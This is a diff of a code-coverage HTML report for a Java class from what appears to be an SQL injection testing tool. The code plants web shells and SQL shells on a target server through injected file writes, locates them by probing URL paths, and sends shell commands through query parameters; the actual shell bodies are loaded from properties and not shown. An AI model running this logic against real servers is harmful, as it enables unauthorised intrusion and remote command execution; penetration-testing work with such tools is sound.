+<span class="fc" id="L417">                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Payload not found: {}&quot;, currentCallable.getUrl());</span>
                 }
-                
-<span class="nc" id="L407">            } catch (InterruptedException e) {</span>
-                
-<span class="nc" id="L409">                LOGGER.log(LogLevelUtil.IGNORE, e, e);</span>
-<span class="nc" id="L410">                Thread.currentThread().interrupt();</span>
-                
-<span class="nc" id="L412">            } catch (ExecutionException e) {</span>
-                
-<span class="nc" id="L414">                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);</span>
-<span class="pc" id="L415">            }</span>
+
+<span class="nc" id="L420">            } catch (InterruptedException e) {</span>
+
+<span class="nc" id="L422">                LOGGER.log(LogLevelUtil.IGNORE, e, e);</span>
+<span class="nc" id="L423">                Thread.currentThread().interrupt();</span>
+
+<span class="nc" id="L425">            } catch (ExecutionException e) {</span>
+
+<span class="nc" id="L427">                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);</span>
+<span class="pc" id="L428">            }</span>
         }
-        
-<span class="fc" id="L418">        return urlSuccess;</span>
-    }
+
+<span class="fc" id="L431">        taskExecutor.shutdown();</span>
+<span class="fc" id="L432">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
+
+<span class="pc bpc" id="L434" title="1 of 2 branches missed.">        if (urlSuccess != null) {</span>
+
+<span class="fc" id="L436">            var request = biFunctionGetRequest.apply(filename, urlSuccess);</span>
+<span class="fc" id="L437">            this.injectionModel.sendToViews(request);</span>
+
+<span class="fc" id="L439">        } else {</span>
+
+<span class="nc" id="L441">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Payload not found&quot;);</span>
+        }
+<span class="fc" id="L443">    }</span>
     
     /**
      * 
@@ -427,30 +451,30 @@ public class ResourceAccess {
         
         String pageSource;
         try {
-<span class="fc" id="L430">            pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);</span>
+<span class="fc" id="L454">            pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);</span>
             
-<span class="nc" id="L432">        } catch (Exception e) {</span>
+<span class="nc" id="L456">        } catch (Exception e) {</span>
             
-<span class="nc" id="L434">            pageSource = StringUtils.EMPTY;</span>
-<span class="fc" id="L435">        }</span>
+<span class="nc" id="L458">            pageSource = StringUtils.EMPTY;</span>
+<span class="fc" id="L459">        }</span>
         
-<span class="fc" id="L437">        var regexSearch = Pattern.compile(&quot;(?s)&lt;&quot;+ DataAccess.LEAD +&quot;&gt;(.*)&lt;&quot;+ DataAccess.TRAIL +&quot;&gt;&quot;).matcher(pageSource);</span>
-<span class="fc" id="L438">        regexSearch.find();</span>
+<span class="fc" id="L461">        var regexSearch = Pattern.compile(&quot;(?s)&lt;&quot;+ DataAccess.LEAD +&quot;&gt;(.*)&lt;&quot;+ DataAccess.TRAIL +&quot;&gt;&quot;).matcher(pageSource);</span>
+<span class="fc" id="L462">        regexSearch.find();</span>
 
         String result;
         
         // IllegalStateException #1544: catch incorrect execution
         try {
-<span class="fc" id="L444">            result = regexSearch.group(1);</span>
+<span class="fc" id="L468">            result = regexSearch.group(1);</span>
             
-<span class="nc" id="L446">        } catch (IllegalStateException e) {</span>
+<span class="nc" id="L470">        } catch (IllegalStateException e) {</span>
             
             // Fix return null from regex
-<span class="nc" id="L449">            result = StringUtils.EMPTY;</span>
-<span class="nc" id="L450">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Incorrect response from Web shell&quot;);</span>
-<span class="fc" id="L451">        }</span>
+<span class="nc" id="L473">            result = StringUtils.EMPTY;</span>
+<span class="nc" id="L474">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Incorrect response from Web shell&quot;);</span>
+<span class="fc" id="L475">        }</span>
         
-<span class="fc" id="L453">        return result;</span>
+<span class="fc" id="L477">        return result;</span>
     }
     
     /**
@@ -461,203 +485,23 @@ public class ResourceAccess {
      */
     public String runWebShell(String command, UUID uuidShell, String urlShell) {
         
-<span class="fc" id="L464">        String result = this.runCommandShell(</span>
-<span class="fc" id="L465">            urlShell + &quot;?c=&quot;+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)</span>
+<span class="fc" id="L488">        String result = this.runCommandShell(</span>
+<span class="fc" id="L489">            urlShell + &quot;?c=&quot;+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)</span>
         );
 
-<span class="pc bpc" id="L468" title="1 of 2 branches missed.">        if (StringUtils.isBlank(result)) {</span>
+<span class="pc bpc" id="L492" title="1 of 2 branches missed.">        if (StringUtils.isBlank(result)) {</span>
             // TODO Payload should redirect directly error to normal output
-<span class="nc" id="L470">            result = &quot;No result.\nTry '&quot;+ command.trim() +&quot; 2&gt;&amp;1' to get a system error message.\n&quot;;</span>
+<span class="nc" id="L494">            result = &quot;No result.\nTry '&quot;+ command.trim() +&quot; 2&gt;&amp;1' to get a system error message.\n&quot;;</span>
         }
 
         // Unfroze interface
-<span class="fc" id="L474">        var request = new Request();</span>
-<span class="fc" id="L475">        request.setMessage(Interaction.GET_WEB_SHELL_RESULT);</span>
-<span class="fc" id="L476">        request.setParameters(uuidShell, result);</span>
-<span class="fc" id="L477">        this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L498">        var request = new Request();</span>
+<span class="fc" id="L499">        request.setMessage(Interaction.GET_WEB_SHELL_RESULT);</span>
+<span class="fc" id="L500">        request.setParameters(uuidShell, result);</span>
+<span class="fc" id="L501">        this.injectionModel.sendToViews(request);</span>
 
-<span class="fc" id="L479">        return result;</span>
+<span class="fc" id="L503">        return result;</span>
     }
-
-    /**
-     * Create SQL shell on the server. Override user name and password eventually.
-     * @param pathShell Script to create on the server
-     * @param urlShell URL for the script (used for url rewriting)
-     * @param username User name for current database
-     * @param password User password for current database
-     * @throws InterruptedException
-     * @throws InjectionFailureException
-     * @throws StoppedByUserSlidingException
-     */
-    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
-        
-<span class="pc bpc" id="L494" title="1 of 2 branches missed.">        if (!this.isReadingAllowed()) {</span>
-            
-<span class="nc" id="L496">            return;</span>
-        }
-        
-<span class="fc" id="L499">        String bodyShell = StringUtil.base64Decode(</span>
-<span class="fc" id="L500">            this.injectionModel.getMediatorUtils()</span>
-<span class="fc" id="L501">            .getPropertiesUtil()</span>
-<span class="fc" id="L502">            .getProperties()</span>
-<span class="fc" id="L503">            .getProperty(&quot;shell.sql&quot;)</span>
-        )
-<span class="fc" id="L505">        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)</span>
-<span class="fc" id="L506">        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);</span>
-
-<span class="fc" id="L508">        String pathShellFixed = pathShell;</span>
-<span class="fc bfc" id="L509" title="All 2 branches covered.">        if (!pathShellFixed.matches(&quot;.*/$&quot;)) {</span>
-            
-<span class="fc" id="L511">            pathShellFixed += &quot;/&quot;;</span>
-        }
-        
-<span class="fc" id="L514">        this.injectionModel.injectWithoutIndex(</span>
-<span class="fc" id="L515">            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(bodyShell, pathShellFixed + this.filenameSqlshell),</span>
-            &quot;shell:create-sql&quot;
-        );
-
-        String resultInjection;
-<span class="fc" id="L520">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
-        
-        try {
-<span class="fc" id="L523">            resultInjection = new SuspendableGetRows(this.injectionModel).run(</span>
-<span class="fc" id="L524">                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameSqlshell),</span>
-                sourcePage,
-<span class="fc" id="L526">                false,</span>
-<span class="fc" id="L527">                1,</span>
-                null,
-                &quot;shell:read&quot;
-            );
-
-<span class="pc bpc" id="L532" title="1 of 2 branches missed.">            if (StringUtils.isEmpty(resultInjection)) {</span>
-                
-<span class="nc" id="L534">                throw new JSqlException(MSG_EMPTY_PAYLOAD);</span>
-            }
-            
-<span class="nc" id="L537">        } catch (JSqlException e) {</span>
-            
-<span class="nc" id="L539">            throw new JSqlException(&quot;injected payload does not match source&quot;, e);</span>
-<span class="fc" id="L540">        }</span>
-        
-<span class="fc" id="L542">        String urlShellFixed = urlShell;</span>
-        
-<span class="fc bfc" id="L544" title="All 2 branches covered.">        if (!urlShellFixed.isEmpty()) {</span>
-            
-<span class="fc" id="L546">            urlShellFixed = urlShellFixed.replaceAll(&quot;/*$&quot;, StringUtils.EMPTY) +&quot;/&quot;;</span>
-        }
-        
-<span class="fc" id="L549">        String url = urlShellFixed;</span>
-<span class="fc bfc" id="L550" title="All 2 branches covered.">        if (StringUtils.isEmpty(url)) {</span>
-            
-<span class="fc" id="L552">            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();</span>
-        }
-
-<span class="pc bpc" id="L555" title="1 of 2 branches missed.">        if (!resultInjection.contains(bodyShell)) {</span>
-            
-<span class="nc" id="L557">            throw this.getIntegrityError(sourcePage);</span>
-        }
-            
-<span class="fc" id="L560">        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;SQL payload created into '{}{}'&quot;, pathShellFixed, this.filenameSqlshell);</span>
-        
-<span class="fc" id="L562">        String urlWithoutProtocol = url.replaceAll(&quot;^https?://[^/]*&quot;, StringUtils.EMPTY);</span>
-        
-        String urlProtocol;
-        
-<span class="pc bpc" id="L566" title="1 of 2 branches missed.">        if (&quot;/&quot;.equals(urlWithoutProtocol)) {</span>
-            
-<span class="nc" id="L568">            urlProtocol = url.replaceAll(&quot;/+$&quot;, StringUtils.EMPTY);</span>
-            
-        } else {
-            
-<span class="fc" id="L572">            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);</span>
-        }
-        
-<span class="fc" id="L575">        String urlWithoutFileName = urlWithoutProtocol.replaceAll(&quot;[^/]*$&quot;, StringUtils.EMPTY).replaceAll(&quot;/+&quot;, &quot;/&quot;);</span>
-        
-<span class="fc" id="L577">        List&lt;String&gt; directoryNames = new ArrayList&lt;&gt;();</span>
-        
-<span class="fc bfc" id="L579" title="All 2 branches covered.">        if (urlWithoutFileName.split(&quot;/&quot;).length == 0) {</span>
-            
-<span class="fc" id="L581">            directoryNames.add(&quot;/&quot;);</span>
-        }
-        
-<span class="fc bfc" id="L584" title="All 2 branches covered.">        for (String directoryName: urlWithoutFileName.split(&quot;/&quot;)) {</span>
-            
-<span class="fc" id="L586">            directoryNames.add(directoryName +&quot;/&quot;);</span>
-        }
-        
-<span class="fc" id="L589">        this.injectShell(username, password, pathShellFixed, urlProtocol, directoryNames);</span>
-<span class="fc" id="L590">    }</span>
-
-    private void injectShell(String username, String password, String pathShellFixed, String urlProtocol, List&lt;String&gt; directoryNames) throws InterruptedException {
-
-<span class="fc" id="L594">        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor(&quot;CallableCreateSqlShell&quot;);</span>
-        
-<span class="fc" id="L596">        CompletionService&lt;CallableHttpHead&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
-        
-<span class="fc" id="L598">        var urlPart = new StringBuilder();</span>
-        
-<span class="fc bfc" id="L600" title="All 2 branches covered.">        for (String segment: directoryNames) {</span>
-            
-<span class="fc" id="L602">            urlPart.append(segment);</span>
-<span class="fc" id="L603">            taskCompletionService.submit(</span>
-                new CallableHttpHead(
-                    urlProtocol + urlPart + this.filenameSqlshell,
-                    this.injectionModel,
-                    &quot;shell:confirm&quot;
-                )
-            );
-<span class="fc" id="L610">        }</span>
-
-<span class="fc" id="L612">        int submittedTasks = directoryNames.size();</span>
-        int tasksHandled;
-<span class="fc" id="L614">        String urlSuccess = null;</span>
-        
-<span class="fc bfc" id="L616" title="All 2 branches covered.">        for (tasksHandled = 0 ; tasksHandled &lt; submittedTasks ; tasksHandled++) {</span>
-            
-            try {
-<span class="fc" id="L619">                CallableHttpHead currentCallable = taskCompletionService.take().get();</span>
-                
-<span class="fc bfc" id="L621" title="All 2 branches covered.">                if (!currentCallable.isHttpResponseOk()) {</span>
-                    
-<span class="fc" id="L623">                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Payload not found at '{}'&quot;, currentCallable.getUrl());</span>
-<span class="fc" id="L624">                    continue;</span>
-                }
-                    
-<span class="fc" id="L627">                urlSuccess = currentCallable.getUrl();</span>
-<span class="fc" id="L628">                LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Payload found: '{}'&quot;, urlSuccess);</span>
-
-<span class="nc" id="L630">            } catch (InterruptedException e) {</span>
-                
-<span class="nc" id="L632">                LOGGER.log(LogLevelUtil.IGNORE, e, e);</span>
-<span class="nc" id="L633">                Thread.currentThread().interrupt();</span>
-                
-<span class="nc" id="L635">            } catch (ExecutionException e) {</span>
-                
-<span class="nc" id="L637">                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);</span>
-<span class="pc" id="L638">            }</span>
-        }
-
-<span class="fc" id="L641">        taskExecutor.shutdown();</span>
-<span class="fc" id="L642">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
-        
-<span class="pc bpc" id="L644" title="1 of 2 branches missed.">        if (urlSuccess != null) {</span>
-            
-<span class="fc" id="L646">            var request = new Request();</span>
-<span class="fc" id="L647">            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);</span>
-<span class="fc" id="L648">            request.setParameters(</span>
-<span class="fc" id="L649">                pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY),</span>
-                urlSuccess,
-                username,
-                password
-            );
-<span class="fc" id="L654">            this.injectionModel.sendToViews(request);</span>
-            
-<span class="fc" id="L656">        } else {</span>
-            
-<span class="nc" id="L658">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;SQL payload not found&quot;);</span>
-        }
-<span class="fc" id="L660">    }</span>
 
     /**
      * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
@@ -669,129 +513,129 @@ public class ResourceAccess {
      */
     public String runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
         
-<span class="fc" id="L672">        String result = this.runCommandShell(</span>
-<span class="fc" id="L673">            String.format(</span>
+<span class="fc" id="L516">        String result = this.runCommandShell(</span>
+<span class="fc" id="L517">            String.format(</span>
                  &quot;%s?q=%s&amp;u=%s&amp;p=%s&quot;,
                  urlShell,
-<span class="fc" id="L676">                 URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),</span>
+<span class="fc" id="L520">                 URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),</span>
                  username,
                  password
             )
         );
             
-<span class="pc bpc" id="L682" title="1 of 2 branches missed.">        if (result.contains(&quot;&lt;SQLr&gt;&quot;)) {</span>
+<span class="pc bpc" id="L526" title="1 of 2 branches missed.">        if (result.contains(&quot;&lt;SQLr&gt;&quot;)) {</span>
 
-<span class="fc" id="L684">            List&lt;List&lt;String&gt;&gt; listRows = this.parse(result);</span>
+<span class="fc" id="L528">            List&lt;List&lt;String&gt;&gt; listRows = this.parse(result);</span>
 
-<span class="pc bpc" id="L686" title="1 of 2 branches missed.">            if (listRows.isEmpty()) {</span>
-<span class="nc" id="L687">                return StringUtils.EMPTY;</span>
+<span class="pc bpc" id="L530" title="1 of 2 branches missed.">            if (listRows.isEmpty()) {</span>
+<span class="nc" id="L531">                return StringUtils.EMPTY;</span>
             }
 
-<span class="fc" id="L690">            List&lt;Integer&gt; listFieldsLength = this.parseColumnLength(listRows);</span>
+<span class="fc" id="L534">            List&lt;Integer&gt; listFieldsLength = this.parseColumnLength(listRows);</span>
 
-<span class="fc" id="L692">            result = this.convert(listRows, listFieldsLength);</span>
+<span class="fc" id="L536">            result = this.convert(listRows, listFieldsLength);</span>
 
-<span class="pc bnc" id="L694" title="All 2 branches missed.">        } else if (result.contains(&quot;&lt;SQLm&gt;&quot;)) {</span>
+<span class="pc bnc" id="L538" title="All 2 branches missed.">        } else if (result.contains(&quot;&lt;SQLm&gt;&quot;)) {</span>
 
-<span class="nc" id="L696">            result = result.replace(&quot;&lt;SQLm&gt;&quot;, StringUtils.EMPTY) + &quot;\n&quot;;</span>
+<span class="nc" id="L540">            result = result.replace(&quot;&lt;SQLm&gt;&quot;, StringUtils.EMPTY) + &quot;\n&quot;;</span>
 
-<span class="nc bnc" id="L698" title="All 2 branches missed.">        } else if (result.contains(&quot;&lt;SQLe&gt;&quot;)) {</span>
+<span class="nc bnc" id="L542" title="All 2 branches missed.">        } else if (result.contains(&quot;&lt;SQLe&gt;&quot;)) {</span>
 
-<span class="nc" id="L700">            result = result.replace(&quot;&lt;SQLe&gt;&quot;, StringUtils.EMPTY) + &quot;\n&quot;;</span>
+<span class="nc" id="L544">            result = result.replace(&quot;&lt;SQLe&gt;&quot;, StringUtils.EMPTY) + &quot;\n&quot;;</span>
         }
 
         // Unfroze interface
-<span class="fc" id="L704">        var request = new Request();</span>
-<span class="fc" id="L705">        request.setMessage(Interaction.GET_SQL_SHELL_RESULT);</span>
-<span class="fc" id="L706">        request.setParameters(uuidShell, result, command);</span>
-<span class="fc" id="L707">        this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L548">        var request = new Request();</span>
+<span class="fc" id="L549">        request.setMessage(Interaction.GET_SQL_SHELL_RESULT);</span>
+<span class="fc" id="L550">        request.setParameters(uuidShell, result, command);</span>
+<span class="fc" id="L551">        this.injectionModel.sendToViews(request);</span>
 
-<span class="fc" id="L709">        return result;</span>
+<span class="fc" id="L553">        return result;</span>
     }
 
     private String convert(List&lt;List&lt;String&gt;&gt; listRows, List&lt;Integer&gt; listFieldsLength) {
         
-<span class="fc" id="L714">        var tableText = new StringBuilder(&quot;+&quot;);</span>
+<span class="fc" id="L558">        var tableText = new StringBuilder(&quot;+&quot;);</span>
         
-<span class="fc bfc" id="L716" title="All 2 branches covered.">        for (Integer fieldLength: listFieldsLength) {</span>
+<span class="fc bfc" id="L560" title="All 2 branches covered.">        for (Integer fieldLength: listFieldsLength) {</span>
             
-<span class="fc" id="L718">            tableText.append(&quot;-&quot;).append(StringUtils.repeat(&quot;-&quot;, fieldLength)).append(&quot;-+&quot;);</span>
-<span class="fc" id="L719">        }</span>
+<span class="fc" id="L562">            tableText.append(&quot;-&quot;).append(StringUtils.repeat(&quot;-&quot;, fieldLength)).append(&quot;-+&quot;);</span>
+<span class="fc" id="L563">        }</span>
         
-<span class="fc" id="L721">        tableText.append(&quot;\n&quot;);</span>
+<span class="fc" id="L565">        tableText.append(&quot;\n&quot;);</span>
 
-<span class="fc bfc" id="L723" title="All 2 branches covered.">        for (List&lt;String&gt; listFields: listRows) {</span>
+<span class="fc bfc" id="L567" title="All 2 branches covered.">        for (List&lt;String&gt; listFields: listRows) {</span>
             
-<span class="fc" id="L725">            tableText.append(&quot;|&quot;);</span>
-<span class="fc" id="L726">            var cursorPosition = 0;</span>
+<span class="fc" id="L569">            tableText.append(&quot;|&quot;);</span>
+<span class="fc" id="L570">            var cursorPosition = 0;</span>
             
-<span class="fc bfc" id="L728" title="All 2 branches covered.">            for (String field: listFields) {</span>
+<span class="fc bfc" id="L572" title="All 2 branches covered.">            for (String field: listFields) {</span>
                 
-<span class="fc" id="L730">                tableText.append(StringUtils.SPACE)</span>
-<span class="fc" id="L731">                    .append(field)</span>
-<span class="fc" id="L732">                    .append(StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length()))</span>
-<span class="fc" id="L733">                    .append(&quot; |&quot;);</span>
-<span class="fc" id="L734">                cursorPosition++;</span>
-<span class="fc" id="L735">            }</span>
+<span class="fc" id="L574">                tableText.append(StringUtils.SPACE)</span>
+<span class="fc" id="L575">                    .append(field)</span>
+<span class="fc" id="L576">                    .append(StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length()))</span>
+<span class="fc" id="L577">                    .append(&quot; |&quot;);</span>
+<span class="fc" id="L578">                cursorPosition++;</span>
+<span class="fc" id="L579">            }</span>
             
-<span class="fc" id="L737">            tableText.append(&quot;\n&quot;);</span>
-<span class="fc" id="L738">        }</span>
+<span class="fc" id="L581">            tableText.append(&quot;\n&quot;);</span>
+<span class="fc" id="L582">        }</span>
 
-<span class="fc" id="L740">        tableText.append(&quot;+&quot;);</span>
+<span class="fc" id="L584">        tableText.append(&quot;+&quot;);</span>
         
-<span class="fc bfc" id="L742" title="All 2 branches covered.">        for (Integer fieldLength: listFieldsLength) {</span>
+<span class="fc bfc" id="L586" title="All 2 branches covered.">        for (Integer fieldLength: listFieldsLength) {</span>
             
-<span class="fc" id="L744">            tableText.append(&quot;-&quot;).append(StringUtils.repeat(&quot;-&quot;, fieldLength)).append(&quot;-+&quot;);</span>
-<span class="fc" id="L745">        }</span>
+<span class="fc" id="L588">            tableText.append(&quot;-&quot;).append(StringUtils.repeat(&quot;-&quot;, fieldLength)).append(&quot;-+&quot;);</span>
+<span class="fc" id="L589">        }</span>
         
-<span class="fc" id="L747">        tableText.append(&quot;\n&quot;);</span>
+<span class="fc" id="L591">        tableText.append(&quot;\n&quot;);</span>
         
-<span class="fc" id="L749">        return tableText.toString();</span>
+<span class="fc" id="L593">        return tableText.toString();</span>
     }
 
     private List&lt;Integer&gt; parseColumnLength(List&lt;List&lt;String&gt;&gt; listRows) {
         
-<span class="fc" id="L754">        List&lt;Integer&gt; listFieldsLength = new ArrayList&lt;&gt;();</span>
+<span class="fc" id="L598">        List&lt;Integer&gt; listFieldsLength = new ArrayList&lt;&gt;();</span>
         
         for (
-<span class="fc" id="L757">            var indexLongestRowSearch = 0;</span>
-<span class="fc bfc" id="L758" title="All 2 branches covered.">            indexLongestRowSearch &lt; listRows.get(0).size();</span>
-<span class="fc" id="L759">            indexLongestRowSearch++</span>
+<span class="fc" id="L601">            var indexLongestRowSearch = 0;</span>
+<span class="fc bfc" id="L602" title="All 2 branches covered.">            indexLongestRowSearch &lt; listRows.get(0).size();</span>
+<span class="fc" id="L603">            indexLongestRowSearch++</span>
         ) {
             
-<span class="fc" id="L762">            int indexLongestRowSearchFinal = indexLongestRowSearch;</span>
+<span class="fc" id="L606">            int indexLongestRowSearchFinal = indexLongestRowSearch;</span>
             
-<span class="fc" id="L764">            listRows.sort(</span>
-<span class="nc" id="L765">                (firstRow, secondRow) -&gt; secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()</span>
+<span class="fc" id="L608">            listRows.sort(</span>
+<span class="nc" id="L609">                (firstRow, secondRow) -&gt; secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()</span>
             );
 
-<span class="fc" id="L768">            listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());</span>
+<span class="fc" id="L612">            listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());</span>
         }
         
-<span class="fc" id="L771">        return listFieldsLength;</span>
+<span class="fc" id="L615">        return listFieldsLength;</span>
     }
 
     private List&lt;List&lt;String&gt;&gt; parse(String result) {
         
-<span class="fc" id="L776">        List&lt;List&lt;String&gt;&gt; listRows = new ArrayList&lt;&gt;();</span>
-<span class="fc" id="L777">        var rowsMatcher = Pattern.compile(&quot;(?si)&lt;tr&gt;(&lt;td&gt;.*?&lt;/td&gt;)&lt;/tr&gt;&quot;).matcher(result);</span>
+<span class="fc" id="L620">        List&lt;List&lt;String&gt;&gt; listRows = new ArrayList&lt;&gt;();</span>
+<span class="fc" id="L621">        var rowsMatcher = Pattern.compile(&quot;(?si)&lt;tr&gt;(&lt;td&gt;.*?&lt;/td&gt;)&lt;/tr&gt;&quot;).matcher(result);</span>
         
-<span class="fc bfc" id="L779" title="All 2 branches covered.">        while (rowsMatcher.find()) {</span>
+<span class="fc bfc" id="L623" title="All 2 branches covered.">        while (rowsMatcher.find()) {</span>
             
-<span class="fc" id="L781">            String values = rowsMatcher.group(1);</span>
+<span class="fc" id="L625">            String values = rowsMatcher.group(1);</span>
 
-<span class="fc" id="L783">            var fieldsMatcher = Pattern.compile(&quot;(?si)&lt;td&gt;(.*?)&lt;/td&gt;&quot;).matcher(values);</span>
-<span class="fc" id="L784">            List&lt;String&gt; listFields = new ArrayList&lt;&gt;();</span>
-<span class="fc" id="L785">            listRows.add(listFields);</span>
+<span class="fc" id="L627">            var fieldsMatcher = Pattern.compile(&quot;(?si)&lt;td&gt;(.*?)&lt;/td&gt;&quot;).matcher(values);</span>
+<span class="fc" id="L628">            List&lt;String&gt; listFields = new ArrayList&lt;&gt;();</span>
+<span class="fc" id="L629">            listRows.add(listFields);</span>
             
-<span class="fc bfc" id="L787" title="All 2 branches covered.">            while (fieldsMatcher.find()) {</span>
+<span class="fc bfc" id="L631" title="All 2 branches covered.">            while (fieldsMatcher.find()) {</span>
                 
-<span class="fc" id="L789">                String field = fieldsMatcher.group(1);</span>
-<span class="fc" id="L790">                listFields.add(field);</span>
-<span class="fc" id="L791">            }</span>
-<span class="fc" id="L792">        }</span>
+<span class="fc" id="L633">                String field = fieldsMatcher.group(1);</span>
+<span class="fc" id="L634">                listFields.add(field);</span>
+<span class="fc" id="L635">            }</span>
+<span class="fc" id="L636">        }</span>
         
-<span class="fc" id="L794">        return listRows;</span>
+<span class="fc" id="L638">        return listRows;</span>
     }
 
     /**
@@ -805,176 +649,176 @@ public class ResourceAccess {
      */
     public void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException, InterruptedException {
         
-<span class="nc bnc" id="L808" title="All 2 branches missed.">        if (!this.isReadingAllowed()) {</span>
+<span class="nc bnc" id="L652" title="All 2 branches missed.">        if (!this.isReadingAllowed()) {</span>
             
-<span class="nc" id="L810">            return;</span>
+<span class="nc" id="L654">            return;</span>
         }
         
-<span class="nc" id="L813">        String bodyShell = StringUtil.base64Decode(</span>
-<span class="nc" id="L814">            this.injectionModel.getMediatorUtils()</span>
-<span class="nc" id="L815">            .getPropertiesUtil()</span>
-<span class="nc" id="L816">            .getProperties()</span>
-<span class="nc" id="L817">            .getProperty(&quot;shell.upload&quot;)</span>
+<span class="nc" id="L657">        String bodyShell = StringUtil.base64Decode(</span>
+<span class="nc" id="L658">            this.injectionModel.getMediatorUtils()</span>
+<span class="nc" id="L659">            .getPropertiesUtil()</span>
+<span class="nc" id="L660">            .getProperties()</span>
+<span class="nc" id="L661">            .getProperty(&quot;shell.upload&quot;)</span>
         )
-<span class="nc" id="L819">        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);</span>
+<span class="nc" id="L663">        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);</span>
         
-<span class="nc" id="L821">        String pathShellFixed = pathFile;</span>
+<span class="nc" id="L665">        String pathShellFixed = pathFile;</span>
         
-<span class="nc bnc" id="L823" title="All 2 branches missed.">        if (!pathShellFixed.matches(&quot;.*/$&quot;)) {</span>
+<span class="nc bnc" id="L667" title="All 2 branches missed.">        if (!pathShellFixed.matches(&quot;.*/$&quot;)) {</span>
             
-<span class="nc" id="L825">            pathShellFixed += &quot;/&quot;;</span>
+<span class="nc" id="L669">            pathShellFixed += &quot;/&quot;;</span>
         }
         
-<span class="nc" id="L828">        this.injectionModel.injectWithoutIndex(</span>
-<span class="nc" id="L829">            this.injectionModel.getMediatorVendor()</span>
-<span class="nc" id="L830">            .getVendor()</span>
-<span class="nc" id="L831">            .instance()</span>
-<span class="nc" id="L832">            .sqlTextIntoFile(</span>
+<span class="nc" id="L672">        this.injectionModel.injectWithoutIndex(</span>
+<span class="nc" id="L673">            this.injectionModel.getMediatorVendor()</span>
+<span class="nc" id="L674">            .getVendor()</span>
+<span class="nc" id="L675">            .instance()</span>
+<span class="nc" id="L676">            .sqlTextIntoFile(</span>
                 &quot;&lt;&quot;+ DataAccess.LEAD +&quot;&gt;&quot;+ bodyShell +&quot;&lt;&quot;+ DataAccess.TRAIL +&quot;&gt;&quot;,
                 pathShellFixed + this.filenameUpload
             ),
             &quot;upload&quot;
         );
 
-<span class="nc" id="L839">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
+<span class="nc" id="L683">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
         String bodyShellInjected;
         
         try {
-<span class="nc" id="L843">            bodyShellInjected = new SuspendableGetRows(this.injectionModel).run(</span>
-<span class="nc" id="L844">                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),</span>
+<span class="nc" id="L687">            bodyShellInjected = new SuspendableGetRows(this.injectionModel).run(</span>
+<span class="nc" id="L688">                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),</span>
                 sourcePage,
-<span class="nc" id="L846">                false,</span>
-<span class="nc" id="L847">                1,</span>
+<span class="nc" id="L690">                false,</span>
+<span class="nc" id="L691">                1,</span>
                 null,
                 &quot;upload&quot;
             );
             
-<span class="nc bnc" id="L852" title="All 2 branches missed.">            if (StringUtils.isEmpty(bodyShellInjected)) {</span>
+<span class="nc bnc" id="L696" title="All 2 branches missed.">            if (StringUtils.isEmpty(bodyShellInjected)) {</span>
                 
-<span class="nc" id="L854">                throw new JSqlException(MSG_EMPTY_PAYLOAD);</span>
+<span class="nc" id="L698">                throw new JSqlException(MSG_EMPTY_PAYLOAD);</span>
             }
             
-<span class="nc" id="L857">        } catch (JSqlException e) {</span>
+<span class="nc" id="L701">        } catch (JSqlException e) {</span>
             
-<span class="nc" id="L859">            throw this.getIntegrityError(sourcePage);</span>
-<span class="nc" id="L860">        }</span>
+<span class="nc" id="L703">            throw this.getIntegrityError(sourcePage);</span>
+<span class="nc" id="L704">        }</span>
 
-<span class="nc" id="L862">        String urlFileFixed = urlFile;</span>
-<span class="nc bnc" id="L863" title="All 2 branches missed.">        if (StringUtils.isEmpty(urlFileFixed)) {</span>
